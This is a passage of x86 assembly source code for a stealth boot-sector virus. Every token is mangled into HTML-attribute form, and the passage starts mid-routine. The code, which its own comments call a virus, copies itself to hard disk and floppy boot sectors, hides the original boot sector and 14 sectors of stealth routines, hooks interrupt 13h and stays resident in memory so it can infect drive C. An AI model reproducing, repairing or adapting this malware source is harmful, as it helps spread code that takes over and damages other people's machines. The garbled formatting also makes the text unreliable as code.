for="" the="" new="" boot="" sector="" call="" put_boot_sec="" ;go="" write="" it="" to="" disk="" pop="" ax="" jc="" inf144m_exit="" mov="" bx,offset="" stealth="" ;buffer="" for="" 14="" sectors="" of="" stealth="" routines="" mov="" dl,al="" ;drive="" to="" write="" to="" mov="" dh,1="" ;head="" 1="" mov="" cx,4f04h="" ;track="" 79,="" sector="" 4="" mov="" ax,030eh="" ;write="" 14="" sectors="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" inf144m_exit:="" ret="" ;all="" done="" ;*******************************************************************************="" ;infect="" hard="" disk="" drive="" al="" with="" this="" virus.="" this="" involves="" the="" following="" steps:="" ;a)="" read="" the="" present="" boot="" sector.="" b)="" copy="" it="" to="" track="" 0,="" head="" 0,="" sector="" 16.="" ;c)="" copy="" the="" disk="" parameter="" info="" into="" the="" new="" boot="" sector="" in="" memory.="" d)="" copy="" the="" ;new="" boot="" sector="" to="" track="" 0,="" head="" 0,="" sector="" 1.="" e)="" copy="" the="" stealth="" routines="" to="" ;track="" 0,="" head="" 0,="" sector="" 2,="" 14="" sectors="" total.="" infect_hard:="" mov="" al,80h="" ;set="" drive="" type="" flag="" to="" hard="" disk="" mov="" [dr_flag],al="" ;cause="" that's="" where="" it's="" going="" call="" get_boot_sec="" ;read="" the="" present="" boot="" sector="" into="" ran="" mov="" bx,offset="" scratchbuf="" ;and="" go="" write="" it="" at="" track="" 0,="" head="" 0,="" sector="" 16="" push="" ax="" mov="" dl,al="" mov="" dh,0="" ;head="" 0="" mov="" cx,0010h="" ;track="" 0,="" sector="" 16="" mov="" ax,0301h="" ;bios="" write,="" for="" 1="" sector="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" pop="" ax="" push="" ax="" mov="" di,offset="" boot_data="" mov="" si,offset="" scratchbuf="" +="" (offset="" boot_data="" -="" offset="" boot_start)="" mov="" cx,1bh="" 2="" ;copy="" boot="" sector="" disk="" info="" over="" rep="" movsw="" ;to="" new="" boot="" sector="" mov="" di,offset="" boot_start="" +="" 200h="" -="" 42h="" mov="" si,offset="" scratchbuf="" +="" 200h="" -="" 42h="" mov="" cx,21h="" ;copy="" partition="" table="" rep="" movsw="" ;to="" new="" boot="" sector="" too!="" pop="" ax="" push="" ax="" ;and="" write="" new="" boot="" sector="" to="" disk="" mov="" bx,offset="" boot_start="" ;this="" is="" buffer="" for="" the="" new="" boot="" sector="" call="" put_boot_sec="" pop="" ax="" mov="" bx,offset="" stealth="" ;buffer="" for="" 14="" sectors="" of="" virus="" routines="" mov="" dl,al="" ;drive="" to="" write="" to="" mov="" dh,0="" ;head="" 0="" mov="" cx,0002h="" ;track="" 0,="" sector="" 2="" mov="" ax,030eh="" ;write="" 14="" sectors="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" ret="" ;*******************************************************************************="" ;this="" routine="" determines="" if="" a="" hard="" drive="" c:="" exists,="" and="" returns="" nz="" if="" it="" does,="" ;z="" if="" it="" does="" not.="" is_hard_there:="" mov="" al,1="" or="" al,al="" ret="" ;read="" the="" boot="" sector="" on="" the="" drive="" al="" into="" scratchbuf.="" this="" routine="" must="" ;prserve="" al!="" get_boot_sec:="" push="" ax="" mov="" bx,offset="" scratchbuf="" ;this="" is="" buffer="" for="" the="" current="" boot="" sector="" mov="" dl,al="" ;this="" is="" the="" drive="" to="" read="" from="" mov="" dh,0="" ;head="" 0="" mov="" ch,0="" ;track="" 0="" mov="" cl,1="" ;sector="" 1="" mov="" al,1="" ;read="" 1="" sector="" mov="" ah,2="" ;bios="" read="" function="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" pop="" ax="" ret="" ;this="" routine="" writes="" the="" boot="" sector="" at="" es:bx="" to="" the="" drive="" in="" al.="" put_boot_sec:="" mov="" dl,al="" ;this="" is="" the="" drive="" to="" write="" to="" mov="" dh,0="" ;head="" 0="" mov="" ch,0="" ;track="" 0="" mov="" cl,1="" ;sector="" 1="" mov="" al,1="" ;read="" 1="" sector="" mov="" ah,3="" ;bios="" write="" function="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" ret="" ;determine="" whether="" the="" boot="" sector="" in="" scratchbuf="" is="" the="" viral="" boot="" sector.="" ;returns="" z="" if="" it="" is,="" nz="" if="" not.="" the="" first="" 30="" bytes="" of="" code,="" starting="" at="" boot,="" ;are="" checked="" to="" see="" if="" they="" are="" identical.="" if="" so,="" it="" must="" be="" the="" viral="" boot="" ;sector.="" it="" is="" assumed="" that="" es="" and="" ds="" are="" properly="" set="" to="" this="" segment="" when="" ;this="" is="" called.="" is_vbs:="" push="" si="" push="" di="" cld="" mov="" di,offset="" boot="" mov="" si,offset="" scratchbuf="" +="" (offset="" boot="" -="" offset="" boot_start)="" mov="" cx,15="" repz="" cmpsw="" pop="" di="" pop="" si="" ret="" dbt_temp="" db="" 0="" ;set="" the="" dbt="" up="" to="" handle="" a="" 1.2="" meg="" floppy="" disk="" drive,="" with="" 15="" sectors="" per="" ;track.="" adjust_dbt:="" push="" es="" push="" ax="" xor="" ax,ax="" mov="" es,ax="" mov="" bx,78h="" les="" bx,es:[bx]="" mov="" al,byte="" ptr="" es:[bx+4]="" mov="" [dbt_temp],al="" mov="" byte="" ptr="" es:[bx+4],0fh="" pop="" ax="" pop="" es="" ret="" ;restore="" the="" dbt="" to="" 9="" sectors="" per="" track,="" which="" is="" the="" default="" value="" stored="" there.="" reset_dbt:="" push="" es="" push="" ax="" xor="" ax,ax="" mov="" es,ax="" mov="" bx,78h="" les="" bx,es:[bx]="" mov="" al,[dbt_temp]="" mov="" byte="" ptr="" es:[bx+4],al="" pop="" ax="" pop="" es="" ret="" ;*******************************************************************************="" ;*="" a="" scratch="" pad="" buffer="" for="" disk="" reads="" and="" writes="" ;*******************************************************************************="" org="" 7a00h="" scratchbuf:="" db="" 512="" dup="" (?)="" ;*******************************************************************************="" ;*="" this="" is="" the="" replacement="" boot="" sector="" *="" ;*******************************************************************************="" org="" 7c00h="" boot_start:="" jmp="" short="" boot="" ;jump="" over="" data="" area="" db="" 0ffh="" ;an="" extra="" byte="" for="" near="" jump="" boot_data:="" db="" 1bh="" dup="" (?)="" ;data="" area="" (will="" be="" copied="" from="" old="" sector)="" dr_flag="" db="" 1="" ;drive="" type="" flag,="" 0="360K" floppy="" ;="" 1="1.2M" floppy="" ;="" 2="720K" floppy="" ;="" 3="1.4M" floppy="" ;="" 80h="Hard" disk="" boot:="" cli="" xor="" ax,ax="" mov="" ss,ax="" mov="" ds,ax="" mov="" es,ax="" ;set="" up="" segment="" registers="" mov="" sp,offset="" boot_start="" ;and="" stack="" pointer="" sti="" mov="" ax,[memsize]="" ;get="" the="" size="" of="" memory="" available="" in="" this="" system="" mov="" cl,6="" shl="" ax,cl="" ;this="" turns="" kb="" into="" a="" segment="" value="" sub="" ax,2a0h+5e0h="" ;subtract="" enough="" so="" this="" code="" will="" have="" the="" right="" offset="" mov="" es,ax="" ;and="" so="" we="" don't="" cross="" a="" dma="" bdy="" formatting="" a="" 1.2="" m="" diskette="" sub="" [memsize],11="" ;go="" memory="" resident="" in="" high="" memory="" go_reloc:="" mov="" si,offset="" boot_start="" ;set="" up="" ds:si="" and="" es:di="" in="" order="" to="" relocate="" this="" code="" mov="" di,si="" mov="" cx,256="" rep="" movsw="" ;and="" move="" this="" sector="" to="" boot_start="" push="" es="" mov="" ax,offset="" reloc="" push="" ax="" ;push="" relocated="" address="" of="" reloc="" onto="" stack="" retf="" ;and="" go="" there="" reloc:="" ;relocated="" code="" begins="" executing="" here="" push="" es="" pop="" ds="" mov="" bx,offset="" stealth="" ;set="" up="" buffer="" to="" read="" virus="" into="" memory="" mov="" al,[dr_flag]="" ;drive="" number="" cmp="" al,0="" ;load="" from="" proper="" drive="" type="" jz="" load_360="" cmp="" al,1="" jz="" load_12m="" cmp="" al,2="" jz="" load_720="" cmp="" al,3="" jz="" load_14m="" ;if="" none="" of="" the="" above,="" then="" it's="" a="" hard="" drive="" load_hard:="" ;load="" virus="" from="" hard="" disk="" mov="" dx,80h="" ;hard="" drive="" 80h,="" head="" 0,="" mov="" ch,0="" ;track="" 0,="" mov="" cl,2="" ;sector="" 2="" jmp="" short="" load="" load_360:="" ;load="" virus="" from="" 360="" k="" floppy="" xor="" dx,dx="" ;head="" 0,="" drive="" 0="" mov="" ch,40="" ;track="" 40="" mov="" cl,1="" ;sector="" 1="" mov="" ax,209h="" ;read="" 9="" sectors="" push="" cx="" int="" 13h="" ;call="" bios="" to="" read="" the="" sectors="" pop="" cx="" add="" bx,9*512="" ;move="" es:bx="" up="" mov="" dx,100h="" ;head="" 1,="" drive="" 0="" mov="" al,6="" ;read="" 6="" more="" sectors="" jmp="" short="" load1="" load_12m:="" ;load="" virus="" from="" 1.2="" meg="" floppy="" mov="" dx,100h="" ;head="" 1,="" drive="" 0="" mov="" ch,80="" ;track="" 80="" mov="" cl,1="" ;sector="" 1="" jmp="" short="" load="" load_720:="" ;load="" virus="" from="" 720k="" floppy="" xor="" dx,dx="" ;head="" 0,="" drive="" 0="" mov="" ch,79="" ;track="" 79="" mov="" cl,4="" ;start="" at="" sector="" 4="" mov="" ax,206h="" ;read="" 6="" sectors="" int="" 13h="" add="" bx,6*512="" mov="" dx,100h="" ;head="" 1,="" drive="" 0="" mov="" cx,79*256+1="" ;track="" 79,="" sector="" 1="" mov="" al,9="" ;read="" 9="" more="" sectors="" jmp="" short="" load1="" ;go="" do="" it="" load_14m:="" mov="" dx,100h="" ;head="" 1,="" drive="" 0="" mov="" ch,79="" ;track="" 79="" mov="" cl,4="" ;start="" at="" sector="" 4="" ;="" jmp="" short="" load="" ;go="" do="" it="" load:="" mov="" al,15="" ;read="" 15="" sectors="" load1:="" mov="" ah,2="" ;read="" command="" int="" 13h="" ;call="" bios="" to="" read="" it="" move_old_bs:="" xor="" ax,ax="" ;now="" move="" old="" boot="" sector="" into="" mov="" es,ax="" ;low="" memory="" mov="" si,offset="" scratchbuf="" ;at="" 0000:7c00="" mov="" di,offset="" boot_start="" mov="" cx,256="" rep="" movsw="" set_segments:="" cli="" mov="" ax,cs="" mov="" ss,ax="" mov="" sp,offset="" stealth="" ;set="" up="" the="" stack="" for="" the="" virus="" push="" cs="" ;and="" also="" the="" segment="" registers="" push="" cs="" pop="" ds="" pop="" es="" install_int13h:="" xor="" ax,ax="" mov="" ds,ax="" mov="" si,13h*4="" ;save="" the="" old="" int="" 13h="" vector="" mov="" di,offset="" old_13h="" movsw="" movsw="" mov="" ax,offset="" int_13h="" ;and="" set="" up="" new="" interrupt="" 13h="" vector="" mov="" bx,13h*4="" mov="" ds:[bx],ax="" mov="" ax,es="" add="" bx,2="" mov="" ds:[bx],ax="" sti="" check_drive:="" push="" cs="" ;set="" segments="" correctly="" pop="" ds="" push="" cs="" pop="" es="" cmp="" byte="" ptr="" [dr_flag],80h="" ;if="" booting="" from="" a="" hard="" drive,="" jz="" done="" ;nothing="" else="" needed="" at="" boot="" time="" floppy_disk:="" ;if="" loading="" from="" a="" floppy="" drive,="" call="" is_hard_there="" ;see="" if="" a="" hard="" disk="" exists="" on="" this="" machine="" jz="" done="" ;no="" hard="" disk,="" nothing="" else="" to="" do="" mov="" al,80h="" ;else="" load="" the="" boot="" sector="" from="" drive="" c="" call="" get_boot_sec="" ;into="" scratchbuf="" call="" is_vbs="" ;and="" check="" it="" to="" see="" if="" it's="" the="" viral="" boot="" sector="" jz="" done="" ;yes,="" hard="" drive="" already="" infected,="" nothing="" to="" do="" call="" infect_hard="" ;no,="" go="" infect="" hard="" drive="" c:="" done:="" mov="" si,offset="" part="" ;clean="" partition="" data="" out="" of="" mov="" di,offset="" part+1="" ;memory="" image="" of="" boot="" sector="" mov="" cx,3fh="" mov="" byte="" ptr="" [si],0="" rep="" movsb="" xor="" ax,ax="" ;now="" go="" execute="" old="" boot="" sector="" push="" ax="" ;at="" 0000:7c00="" mov="" ax,offset="" boot_start="" push="" ax="" retf="" org="" 7dbeh="" part="" db="" 40h="" dup="" (?)="" ;partition="" table="" goes="" here="" org="" 7dfeh="" db="" 55h,0aah="" ;boot="" sector="" id="" goes="" here="" endcode:="" comseg="" ends="" end="" start="" ="">